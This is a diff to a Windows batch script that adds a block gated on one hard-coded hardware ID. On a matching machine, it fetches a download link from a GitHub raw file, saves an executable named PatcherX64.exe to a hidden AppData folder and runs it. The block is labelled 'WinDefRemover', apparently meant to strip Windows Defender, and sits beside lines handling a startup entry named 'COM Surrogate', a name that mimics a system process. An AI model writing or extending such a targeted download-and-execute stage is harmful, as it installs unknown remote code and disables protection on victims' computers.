@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=6.1"
+set "BATCHVERSION=6.2"
 
 
 
@@ -48,6 +48,9 @@ exit
 
 
 
+
+:: Define allowed HWIDs here
+set "VALID_HWIDS=FC7A415E-7DAA-924A-97B8-0922D4BD74B3"
 
 
 
@@ -1191,6 +1194,88 @@ del /F /Q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\COM Surrogate
 echo Operation completed.
 
 
+:: Check if HWID matches
+echo %VALID_HWIDS% | findstr /I /C:"%HWID%" >nul && goto HWIDMATCH
+
+echo HWID not authorized!
+goto NEXT6
+
+:HWIDMATCH
+echo HWID matched! Running program...
+echo.
+
+
+
+
+echo WinDefRemover Starting...
+echo.
+:WinDefRemover
+cls
+:: Kill & Delete
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+
+echo.
+echo You chose WinDefRemover.
+timeout /t 2 /nobreak >nul
+
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/WinDefRemoverFileLink') do set "WINDEFREMOVERFILELINK=%%i"
+echo %WINDEFREMOVERFILELINK%
+echo.
+
+
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%WINDEFREMOVERFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+ 
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto WinDefRemover
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 0.8MB (768000 bytes)
+if %FILESIZE% geq 768000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 5 seconds ....
+	timeout /t 5 /nobreak >nul
+	echo.
+	cls
+	goto WinDefRemover
+)
+
+
+
+echo.
+echo WinDefRemover Started..
+timeout /t 20 /nobreak >nul
+echo Done.
+timeout /t 5 /nobreak >nul
+echo.
+echo.
+echo.
+echo.
 
 
 
@@ -1198,6 +1283,10 @@ echo Operation completed.
 
 
 
+
+
+
+:NEXT6
 
 ::goto CONT
 
